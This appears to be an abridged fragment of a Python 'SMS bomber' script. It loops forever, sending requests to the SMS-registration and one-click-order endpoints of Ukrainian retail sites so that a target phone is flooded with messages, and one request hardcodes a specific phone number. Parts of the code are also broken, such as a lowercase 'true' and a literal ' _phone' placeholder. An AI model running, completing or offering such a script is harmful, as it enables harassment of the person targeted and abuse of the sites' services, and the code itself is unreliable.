...
while True:
    ...
    try:
        requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32', data={result: "ok"})
    ...
    try:
        requests.post('https://my.prom.ua/product_view/one_click', data={"is_mobile":true,"product_id":1129504143,"client_uuid":"","phone":" _phone","is_phone_raw":true,"source":"company_site","place":"member"})
        print('[+] Prom sent!')
    except:
        print('[-] error in sent!')
